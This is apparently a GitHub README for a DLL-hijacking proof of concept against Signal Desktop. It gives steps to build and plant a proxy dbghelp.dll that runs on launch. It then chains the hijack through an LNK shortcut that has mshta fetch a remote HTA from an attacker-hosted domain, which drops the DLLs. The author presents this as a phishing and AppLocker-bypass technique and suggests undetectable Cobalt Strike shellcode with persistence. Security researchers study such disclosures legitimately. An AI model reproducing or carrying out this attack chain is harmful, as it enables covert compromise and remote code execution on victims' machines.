## EDIT:
2024/05/08 --> It's been brought to my attention that "cryptbase.dll" no longer works, so in short, Signal said this wasn't a vulnerability yet patched something that wasn't a vulnerability. I've updated this repo to use dbghelp.dll instead. Github's find and replace function is very useful. I've also added the gen_def.py script for your ease of use, huge shouts to Tothi for that.

# Summary 
Multiple instances of DLL planting exist, and a threat actor can plant DLLs that don't exist but are referenced by the application. 

# Steps to Replicate
1. First, create a malicious DLL. Signal references many non-existent DLLs, but several of the DLLs are native to Windows. For this example, I used `dbghelp.dll`. You can use [this repository](https://github.com/tothi/dll-hijack-by-proxying) to build the DLL, but I'll simplify their steps for you, by also including the definition generator in this repo, meaning you don't have to clone that repo if you don't want to:
   * Clone the repo.
   * Modify the `dbghelp.c` file in this repo as you see fit - note that this is nothing more than the payload.
   * Copy `C:\Windows\System32\dbghelp.dll` into the `dll-hijack-by-proxying` directory as `dbghelp_original.dll`.
   * Create the exports using the `gen_def.py` script

    ```
    python3 gen_def.py dbghelp_orig.dll > dbghelp.def
    ```
   
   * Run the following command if you're compiling for x64 Windows:

    ```
    x86_64-w64-mingw32-gcc -shared -o dbghelp.dll dbghelp.c dbghelp.def -s
    ```

2. Now you've got your malicious DLL. Copy `dbghelp.dll` and `dbghelp_orig.dll` into the `%LocalAppData\Programs\signal-desktop` folder.
3. Run Signal, and the code will execute. Here's a cute calculator PoC example:
   
    ![Calculator PoC](https://github.com/johnjhacking/Signal-DLL-Hijacking/blob/main/1.png?raw=true)

# Turning up the Heat
If you're like me, simply popping the calculator isn't enough. Let's chain this as an LNK -> HTA -> Your Payload. You might be wondering what the purpose of building this type of chain serves. Simple: you can chain this as a bypass against something like AppLocker or a default deny tool, leveraging the trust of the product as a safe messenger. In addition, an LNK pretext will allow you to get the user to download the DLLs into the appropriate folder.

1. Create an LNK shortcut, and change the target to the following:

    ```
    C:\Windows\System32\mshta.exe https://yourdomain/poc.hta
    ```

    It should look something like this:
   
    ![LNK PoC](https://github.com/johnjhacking/Signal-DLL-Hijacking/blob/main/2.png?raw=true)

2. Host your `dbghelp.dll` and `dbghelp_orig.dll` files.
3. Modify the code in the `poc.hta` file within this GitHub repo to utilize the URLs of your hosted DLL files.
4. Host `poc.hta` on your domain.
5. Run the LNK shortcut and watch as the DLL files are dropped into the `%LocalAppData\Programs\signal-desktop` folder.
6. Now, when the victim runs Signal, your malicious DLL will run. Phishing ftw.
7. You can use whatever you want, but for a quick test, I hosted an HTA server to see if my HTA would drop the DLLs that execute an HTA, mostly for the nonsense of the chain, so in my case, the chain was LNK -> HTA drops DLLs -> User runs Signal -> DLL executes remote HTA. In a live scenario, I'd swap the HTA payload out with a FUD DLL payload, built with compiled Cobalt Strike or Brute Rat shellcode with persistence, depending on the EDR i'm up against.
   
    ![RCE Proof](https://github.com/johnjhacking/Signal-DLL-Hijacking/blob/main/3.png?raw=true)
